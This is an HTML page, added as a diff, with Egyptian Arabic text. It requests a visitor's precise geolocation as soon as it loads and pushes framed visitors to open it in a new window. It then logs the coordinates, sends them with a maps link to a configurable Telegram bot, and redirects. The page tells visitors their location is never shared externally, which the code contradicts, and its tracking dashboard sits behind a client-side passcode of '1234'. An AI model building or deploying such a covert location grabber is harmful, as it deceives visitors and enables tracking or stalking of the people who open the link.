@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#0B1620">
+<meta name="color-scheme" content="dark">
+<title>تحديد الموقع</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+<style>
+
+  /* =========================================================
+     إعدادات سريعة — عدّل القيم دي بس، مش محتاج تلمس أي حاجة تانية
+     ========================================================= */
+  /* شايلها هنا في التعليقات عشان توصف كل إعداد، لكن القيم الحقيقية
+     موجودة في كود الـ JS تحت (داخل CONFIG) */
+
+  :root{
+    --bg: #0B1620;
+    --bg-glow: radial-gradient(circle at 50% 20%, rgba(232,179,76,0.10), transparent 60%);
+    --surface: #121D28;
+    --surface-2: #17232F;
+    --border: rgba(255,255,255,0.08);
+    --text: #EAF2F2;
+    --text-dim: #93A9B0;
+    --accent: #E8B34C;
+    --accent-strong: #F4C568;
+    --success: #4ADE80;
+    --danger: #F58C8C;
+    --radius: 18px;
+  }
+
+  *{ box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+  html, body{
+    margin: 0;
+    padding: 0;
+    min-height: 100%;
+    background: var(--bg-glow), var(--bg);
+    color: var(--text);
+    font-family: 'Tajawal', system-ui, sans-serif;
+    -webkit-text-size-adjust: 100%;
+    text-size-adjust: 100%;
+  }
+
+  body{
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    min-height: 100dvh;
+    padding: max(16px, env(safe-area-inset-top)) max(16px, env(safe-area-inset-right)) max(16px, env(safe-area-inset-bottom)) max(16px, env(safe-area-inset-left));
+    overflow-x: hidden;
+  }
+
+  .card{
+    width: 100%;
+    max-width: 420px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 40px 28px 32px;
+    text-align: center;
+  }
+
+  .pin-wrap{
+    width: 84px;
+    height: 84px;
+    margin: 0 auto 22px;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .pin-ring{
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+    border: 1.5px solid var(--accent);
+    opacity: 0;
+  }
+
+  .locating .pin-ring{
+    animation: pulse 1.8s ease-out infinite;
+  }
+  .pin-ring:nth-child(2){ animation-delay: .6s; }
+  .pin-ring:nth-child(3){ animation-delay: 1.2s; }
+
+  @keyframes pulse{
+    0%   { transform: scale(.5); opacity: .7; }
+    100% { transform: scale(1.15); opacity: 0; }
+  }
+
+  .pin-icon{
+    width: 40px; height: 40px;
+    z-index: 1;
+  }
+
+  h1{
+    font-size: 1.4rem;
+    font-weight: 800;
+    margin: 0 0 10px;
+    line-height: 1.4;
+  }
+
+  p.msg{
+    font-size: .96rem;
+    color: var(--text-dim);
+    line-height: 1.75;
+    margin: 0 0 26px;
+  }
+
+  button{
+    appearance: none;
+    -webkit-appearance: none;
+    touch-action: manipulation;
+  }
+
+  button.primary{
+    width: 100%;
+    min-height: 50px;
+    border: none;
+    border-radius: 12px;
+    padding: 15px 20px;
+    background: var(--accent);
+    color: #14202B;
+    font-family: inherit;
+    font-size: 1rem;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background .15s ease, transform .1s ease;
+  }
+  button.primary:hover{ background: var(--accent-strong); }
+  button.primary:active{ transform: scale(.98); }
+  button.primary:disabled{ opacity: .55; cursor: default; }
+  button.primary:focus-visible{ outline: 2px solid var(--accent-strong); outline-offset: 3px; }
+
+  button.ghost{
+    width: 100%;
+    min-height: 48px;
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 13px 20px;
+    background: transparent;
+    color: var(--text);
+    font-family: inherit;
+    font-size: .92rem;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 10px;
+  }
+  button.ghost:active{ transform: scale(.98); }
+  button.ghost:focus-visible{ outline: 2px solid var(--accent-strong); outline-offset: 3px; }
+
+  .foot-note{
+    margin-top: 22px;
+    font-size: .78rem;
+    color: var(--text-dim);
+    line-height: 1.6;
+  }
+
+  .state-icon{
+    font-size: 2.2rem;
+    line-height: 1;
+    margin-bottom: 6px;
+  }
+  .state-icon.success{ color: var(--success); }
+  .state-icon.error{ color: var(--danger); }
+
+  [hidden]{ display: none !important; }
+
+  /* ===================== لوحة المتابعة (Admin) ===================== */
+
+  .admin{
+    width: 100%;
+    max-width: 640px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 28px;
+  }
+
+  .admin h1{ text-align: right; font-size: 1.25rem; }
+
+  .admin-top{
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    margin-bottom: 18px;
+    flex-wrap: wrap;
+  }
+
+  .admin-count{
+    font-size: .88rem;
+    color: var(--text-dim);
+  }
+
+  .admin-actions{ display: flex; gap: 8px; }
+
+  .btn-sm{
+    border: 1px solid var(--border);
+    background: var(--surface-2);
+    color: var(--text);
+    border-radius: 10px;
+    padding: 8px 14px;
+    font-family: inherit;
+    font-size: .84rem;
+    cursor: pointer;
+  }
+  .btn-sm:hover{ border-color: var(--accent); }
+
+  table{
+    width: 100%;
+    border-collapse: collapse;
+    font-size: .88rem;
+  }
+  th, td{
+    text-align: right;
+    padding: 10px 8px;
+    border-bottom: 1px solid var(--border);
+  }
+  th{
+    color: var(--text-dim);
+    font-weight: 600;
+    font-size: .8rem;
+  }
+  td a{ color: var(--accent); text-decoration: none; }
+  td a:hover{ text-decoration: underline; }
+
+  .empty-state{
+    text-align: center;
+    color: var(--text-dim);
+    padding: 40px 10px;
+    font-size: .9rem;
+  }
+
+  .passcode-box{
+    max-width: 320px;
+    margin: 0 auto;
+    text-align: center;
+  }
+  .passcode-box input{
+    width: 100%;
+    padding: 14px;
+    border-radius: 10px;
+    border: 1px solid var(--border);
+    background: var(--surface-2);
+    color: var(--text);
+    font-family: inherit;
+    font-size: 16px; /* يمنع تكبير الشاشة تلقائي في آيفون عند التركيز على الحقل */
+    appearance: none;
+    -webkit-appearance: none;
+    text-align: center;
+    margin-bottom: 12px;
+  }
+
+  /* ===================== موبايلات صغيرة ===================== */
+  @media (max-width: 380px){
+    .card{ padding: 30px 18px 24px; }
+    h1{ font-size: 1.2rem; }
+    p.msg{ font-size: .9rem; }
+    .pin-wrap{ width: 72px; height: 72px; }
+    .pin-icon{ width: 34px; height: 34px; }
+    .admin{ padding: 18px 14px; }
+    .admin h1{ font-size: 1.1rem; }
+  }
+
+  /* جدول لوحة المتابعة: على الشاشات الضيقة نحوّله لكروت مرصوصة بدل الأعمدة */
+  @media (max-width: 560px){
+    table, thead, tbody, tr, th, td{ display: block; width: 100%; }
+    thead{ display: none; }
+    tbody tr{
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 4px 14px;
+      margin-bottom: 10px;
+    }
+    tbody td{
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 14px;
+      border-bottom: 1px solid var(--border);
+      padding: 10px 0;
+    }
+    tbody td:last-child{ border-bottom: none; }
+    tbody td::before{
+      content: attr(data-label);
+      color: var(--text-dim);
+      font-size: .78rem;
+      flex-shrink: 0;
+    }
+  }
+</style>
+</head>
+<body>
+
+  <!-- شاشة العميل: طلب الموقع ثم التحويل -->
+  <main class="card" id="gate" hidden>
+    <div class="pin-wrap" id="pinWrap">
+      <div class="pin-ring"></div>
+      <div class="pin-ring"></div>
+      <div class="pin-ring"></div>
+      <svg class="pin-icon" id="pinIcon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 21s7-7.1 7-12a7 7 0 1 0-14 0c0 4.9 7 12 7 12Z" stroke="#E8B34C" stroke-width="1.6"/>
+        <circle cx="12" cy="9" r="2.4" stroke="#E8B34C" stroke-width="1.6"/>
+      </svg>
+    </div>
+
+    <h1 id="title">تحديد الموقع</h1>
+    <p class="msg" id="message">علشان نقدر نوصلك بأسرع وأدق طريقة، محتاجين نعرف موقعك الحالي.</p>
+
+    <button class="primary" id="mainBtn">تفعيل الموقع والمتابعة</button>
+    <button class="ghost" id="retryBtn" hidden>إعادة المحاولة</button>
+
+    <p class="foot-note" id="footNote">موقعك بيُستخدم فقط لتحسين الخدمة المقدّمة لك، ومش بيتم مشاركته مع أي جهة خارجية.</p>
+  </main>
+
+  <!-- شاشة تسجيل الدخول للوحة المتابعة -->
+  <main class="card" id="passGate" hidden>
+    <h1>لوحة متابعة الزيارات</h1>
+    <div class="passcode-box">
+      <input type="password" id="passInput" placeholder="أدخل كلمة المرور">
+      <button class="primary" id="passBtn">دخول</button>
+      <p class="foot-note" id="passErr" hidden style="color:var(--danger)">كلمة المرور غلط، جرّب تاني.</p>
+    </div>
+  </main>
+
+  <!-- لوحة متابعة الزيارات -->
+  <main class="admin" id="admin" hidden>
+    <div class="admin-top">
+      <h1>زيارات العملاء</h1>
+      <div class="admin-actions">
+        <button class="btn-sm" id="refreshBtn">تحديث</button>
+      </div>
+    </div>
+    <p class="admin-count" id="countLabel">جاري التحميل...</p>
+    <div id="tableWrap"></div>
+  </main>
+
+<script>
+/* =========================================================
+   CONFIG — عدّل القيم دي حسب مشروعك
+   ========================================================= */
+const CONFIG = {
+  // اسم عملك أو صفحتك، بيظهر كعنوان للصفحة
+  businessName: "اسم موقعك هنا",
+
+  // الرسالة اللي تظهر قبل طلب الموقع — اشرح فيها باختصار ليه محتاج الموقع
+  preMessage: "علشان نقدر نوصلك بأسرع وأدق طريقة، محتاجين نعرف موقعك الحالي.",
+
+  // الرابط اللي هيتحول له الزائر بعد الموافقة على مشاركة الموقع
+  // هيتضاف لإحداثيات (lat, lng) تلقائي كـ query params في آخر الرابط
+  redirectUrl: "https://example.com",
+
+  // أقصى وقت (بالمللي ثانية) بننتظره لإرسال الموقع (تيليجرام + السجل) قبل ما نحوّل الزائر
+  maxWaitBeforeRedirectMs: 4000,
+
+  // كلمة مرور بسيطة لفتح لوحة متابعة الزيارات (?admin=1 في آخر الرابط)
+  // ملحوظة مهمة: دي حماية بسيطة على مستوى المتصفح فقط، مش حماية حقيقية
+  adminPasscode: "1234",
+
+  // --- إعدادات بوت تيليجرام ---
+  // توكن البوت من BotFather. سيبه فاضي "" لو مش عايز إرسال تيليجرام
+  telegramBotToken: "",
+  // الـ chat_id بتاعك أو بتاع الجروب/القناة اللي هيوصلها الإشعار
+  telegramChatId: "",
+};
+
+/* ========================================================= */
+
+const STORAGE_PREFIX = "visit:";
+const hasStorage = typeof window.storage !== "undefined";
+const params = new URLSearchParams(window.location.search);
+const isAdminRequest = params.has("admin");
+
+const els = {
+  gate: document.getElementById("gate"),
+  pinWrap: document.getElementById("pinWrap"),
+  title: document.getElementById("title"),
+  message: document.getElementById("message"),
+  mainBtn: document.getElementById("mainBtn"),
+  retryBtn: document.getElementById("retryBtn"),
+  footNote: document.getElementById("footNote"),
+
+  passGate: document.getElementById("passGate"),
+  passInput: document.getElementById("passInput"),
+  passBtn: document.getElementById("passBtn"),
+  passErr: document.getElementById("passErr"),
+
+  admin: document.getElementById("admin"),
+  countLabel: document.getElementById("countLabel"),
+  tableWrap: document.getElementById("tableWrap"),
+  refreshBtn: document.getElementById("refreshBtn"),
+};
+
+const ua = navigator.userAgent || "";
+const isIOS = /iphone|ipad|ipod/i.test(ua);
+const isAndroid = /android/i.test(ua);
+
+/* ---------------- شاشة العميل: طلب الموقع ثم التحويل ---------------- */
+
+function initGate(){
+  els.gate.hidden = false;
+  els.title.textContent = CONFIG.businessName;
+  els.message.textContent = CONFIG.preMessage;
+  els.retryBtn.onclick = requestLocation;
+
+  if (!window.isSecureContext) {
+    setState({
+      title: "الصفحة لازم تفتح عن طريق رابط https",
+      message: "تحديد الموقع بيشتغل بس على اتصال آمن (https). تأكد إن الرابط اللي بتفتحه يبدأ بـ https://",
+      showRetry: false, showMain: false,
+    });
+    return;
+  }
+
+  if (!("geolocation" in navigator)) {
+    setState({
+      title: "المتصفح مش بيدعم تحديد الموقع",
+      message: "جرّب تفتح الرابط من متصفح تاني أو من موبايلك.",
+      showRetry: false, showMain: false,
+    });
+    return;
+  }
+
+  // لو الصفحة بتتفتح جوه معاينة/إطار مدمج (زي معاينة المحادثة)، المتصفحات
+  // بتمنع طلب إذن الموقع نهائيًا من غير ما تظهر أي رسالة. لازم الرابط
+  // يتفتح مباشرة كصفحة مستقلة عشان الإذن يظهر صح على أي فون.
+  if (window.self !== window.top) {
+    els.mainBtn.textContent = "فتح الرابط في نافذة جديدة";
+    els.mainBtn.onclick = () => window.open(window.location.href, "_blank");
+    setState({
+      title: "افتح الرابط مباشرة في المتصفح",
+      message: "الصفحة دلوقتي بتتعرض جوه معاينة مدمجة، وده بيمنع طلب إذن الموقع في أغلب الهواتف. دوس الزرار عشان تفتح الرابط في نافذة مستقلة ويشتغل عادي.",
+      showMain: true, showRetry: false,
+    });
+    return;
+  }
+
+  els.mainBtn.textContent = "تفعيل الموقع والمتابعة";
+  els.mainBtn.onclick = requestLocation;
+
+  // نطلب الموقع تلقائيًا أول ما الصفحة تفتح، من غير ما ننتظر دوسة زرار
+  requestLocation();
+}
+
+function setState({title, message, showMain = true, showRetry = false, locating = false, icon = null}){
+  els.title.textContent = title;
+  els.message.textContent = message;
+  els.mainBtn.hidden = !showMain;
+  els.retryBtn.hidden = !showRetry;
+  els.pinWrap.classList.toggle("locating", locating);
+
+  const existingIcon = document.getElementById("stateGlyph");
+  if (existingIcon) existingIcon.remove();
+}
+
+function requestLocation(){
+  els.mainBtn.disabled = true;
+  setState({
+    title: "بنحدد موقعك دلوقتي...",
+    message: "من فضلك اسمح بمشاركة الموقع لما المتصفح يطلب منك.",
+    showMain: false,
+    locating: true,
+  });
+
+  navigator.geolocation.getCurrentPosition(onLocationSuccess, onLocationError, {
+    enableHighAccuracy: true,
+    timeout: 12000,
+    maximumAge: 0,
+  });
+}
+
+async function saveVisit(latitude, longitude, accuracy, timeIso){
+  try {
+    const id = Date.now() + "-" + Math.random().toString(36).slice(2, 8);
+    const entry = { lat: latitude, lng: longitude, accuracy, time: timeIso };
+    await window.storage.set(STORAGE_PREFIX + id, JSON.stringify(entry), true);
+  } catch (e) {
+    console.error("تعذر حفظ الموقع في السجل:", e);
+  }
+}
+
+async function sendToTelegram(latitude, longitude, accuracy, timeStr){
+  const base = `https://api.telegram.org/bot${CONFIG.telegramBotToken}`;
+  const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+  try {
+    // بيبعت الموقع كدبوس حقيقي على الخريطة جوه تيليجرام
+    await fetch(`${base}/sendLocation`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CONFIG.telegramChatId,
+        latitude,
+        longitude,
+        horizontal_accuracy: accuracy ? Math.min(accuracy, 1500) : undefined,
+      }),
+    });
+
+    // رسالة نصية بتفاصيل إضافية (الوقت والدقة ورابط خرائط جوجل)
+    const accText = accuracy ? `± ${Math.round(accuracy)} م` : "غير متاحة";
+    await fetch(`${base}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CONFIG.telegramChatId,
+        text: `📍 زيارة جديدة\nالوقت: ${timeStr}\nدقة الموقع: ${accText}\nالخريطة: ${mapsUrl}`,
+      }),
+    });
+  } catch (e) {
+    console.error("تعذر الإرسال إلى تيليجرام:", e);
+  }
+}
+
+async function onLocationSuccess(position){
+  const { latitude, longitude, accuracy } = position.coords;
+  const timeIso = new Date().toISOString();
+  const timeStr = new Date().toLocaleString("ar-EG", { dateStyle: "medium", timeStyle: "short" });
+
+  setState({
+    title: "تم تحديد موقعك",
+    message: "بنجهزلك التحويل...",
+    showMain: false,
+    locating: true,
+  });
+
+  const tasks = [];
+  if (hasStorage) tasks.push(saveVisit(latitude, longitude, accuracy, timeIso));
+  if (CONFIG.telegramBotToken && CONFIG.telegramChatId) {
+    tasks.push(sendToTelegram(latitude, longitude, accuracy, timeStr));
+  }
+
+  // ننتظر الإرسال يخلص، لكن من غير ما نعلّق التحويل أكتر من الحد الأقصى المحدد
+  await Promise.race([
+    Promise.allSettled(tasks),
+    new Promise((resolve) => setTimeout(resolve, CONFIG.maxWaitBeforeRedirectMs)),
+  ]);
+
+  redirectWithLocation(latitude, longitude);
+}
+
+function onLocationError(error){
+  els.mainBtn.disabled = false;
+  let message = "حصل خطأ في تحديد الموقع، جرّب تاني.";
+
+  if (error.code === error.PERMISSION_DENIED) {
+    if (isIOS) {
+      message = "المتصفح رافض إذن الموقع. افتح إعدادات الآيفون ← الخصوصية والأمان ← خدمات الموقع وتأكد إنها شغالة، وبعدين افتح إعدادات نفس المتصفح وفعّل صلاحية الموقع لهذا الموقع تحديدًا، وارجع جرّب تاني.";
+    } else if (isAndroid) {
+      message = "المتصفح رافض إذن الموقع. دوس على أيقونة القفل بجانب الرابط فوق، افتح \"أذونات الموقع\"، وفعّل \"الموقع\"، وبعدين ارجع جرّب تاني.";
+    } else {
+      message = "المتصفح رافض إذن الموقع. افتح إعدادات الموقع من المتصفح وفعّل صلاحية الموقع، وبعدين جرّب تاني.";
+    }
+  } else if (error.code === error.POSITION_UNAVAILABLE) {
+    message = "مش قادرين نحدد موقعك دلوقتي. تأكد إن خدمة تحديد الموقع (GPS) مفعّلة وجرّب تاني.";
+  } else if (error.code === error.TIMEOUT) {
+    message = "استغرق تحديد الموقع وقت طويل. جرّب تاني.";
+  }
+
+  setState({
+    title: "محتاجين نوصل لموقعك",
+    message,
+    showMain: false,
+    showRetry: true,
+  });
+}
+
+function redirectWithLocation(lat, lng){
+  try {
+    const url = new URL(CONFIG.redirectUrl);
+    url.searchParams.set("lat", lat);
+    url.searchParams.set("lng", lng);
+    window.location.href = url.toString();
+  } catch (e) {
+    setState({
+      title: "الرابط الهدف غير مضبوط",
+      message: "من فضلك غيّر قيمة redirectUrl في إعدادات الصفحة (CONFIG) لرابط صحيح.",
+      showMain: false,
+    });
+  }
+}
+
+/* ---------------- لوحة متابعة الزيارات ---------------- */
+
+function initAdminFlow(){
+  els.passGate.hidden = false;
+  els.passBtn.addEventListener("click", tryUnlock);
+  els.passInput.addEventListener("keydown", (e) => { if (e.key === "Enter") tryUnlock(); });
+}
+
+function tryUnlock(){
+  if (els.passInput.value === CONFIG.adminPasscode) {
+    els.passGate.hidden = true;
+    els.admin.hidden = false;
+    els.refreshBtn.addEventListener("click", loadVisits);
+    loadVisits();
+  } else {
+    els.passErr.hidden = false;
+  }
+}
+
+async function loadVisits(){
+  els.countLabel.textContent = "جاري التحميل...";
+  els.tableWrap.innerHTML = "";
+
+  if (!hasStorage) {
+    els.countLabel.textContent = "";
+    els.tableWrap.innerHTML = `<div class="empty-state">لوحة المتابعة دي بتشتغل بس لما الصفحة تتفتح كـ رابط منشور من كلود. لو الصفحة متنزّلة ومستضافة على سيرفر تاني، محتاج تربطها بقاعدة بيانات خاصة بيك.</div>`;
+    return;
+  }
+
+  let keys = [];
+  try {
+    const result = await window.storage.list(STORAGE_PREFIX, true);
+    keys = (result && result.keys) ? result.keys : [];
+  } catch (e) {
+    els.countLabel.textContent = "";
+    els.tableWrap.innerHTML = `<div class="empty-state">تعذر تحميل الزيارات، جرّب تحدّث الصفحة.</div>`;
+    return;
+  }
+
+  const entries = [];
+  for (const key of keys) {
+    try {
+      const r = await window.storage.get(key, true);
+      if (r && r.value) entries.push(JSON.parse(r.value));
+    } catch (e) { /* تجاهل السجل ده كمّل اللي بعده */ }
+  }
+
+  entries.sort((a, b) => new Date(b.time) - new Date(a.time));
+  renderTable(entries);
+}
+
+function renderTable(entries){
+  els.countLabel.textContent = `إجمالي الزيارات المسجّلة: ${entries.length}`;
+
+  if (entries.length === 0) {
+    els.tableWrap.innerHTML = `<div class="empty-state">لسه مفيش زيارات متسجّلة.</div>`;
+    return;
+  }
+
+  const rows = entries.map((e) => {
+    const time = new Date(e.time).toLocaleString("ar-EG", { dateStyle: "medium", timeStyle: "short" });
+    const acc = e.accuracy ? `± ${Math.round(e.accuracy)} م` : "—";
+    const mapUrl = `https://www.google.com/maps?q=${e.lat},${e.lng}`;
+    return `<tr>
+      <td data-label="وقت الزيارة">${time}</td>
+      <td data-label="دقة الموقع">${acc}</td>
+      <td data-label="الموقع"><a href="${mapUrl}" target="_blank" rel="noopener">فتح على الخريطة</a></td>
+    </tr>`;
+  }).join("");
+
+  els.tableWrap.innerHTML = `
+    <table>
+      <thead><tr><th>وقت الزيارة</th><th>دقة الموقع</th><th>الموقع</th></tr></thead>
+      <tbody>${rows}</tbody>
+    </table>`;
+}
+
+/* ---------------- نقطة البداية ---------------- */
+
+if (isAdminRequest) {
+  initAdminFlow();
+} else {
+  initGate();
+}
+</script>
+</body>
+</html>
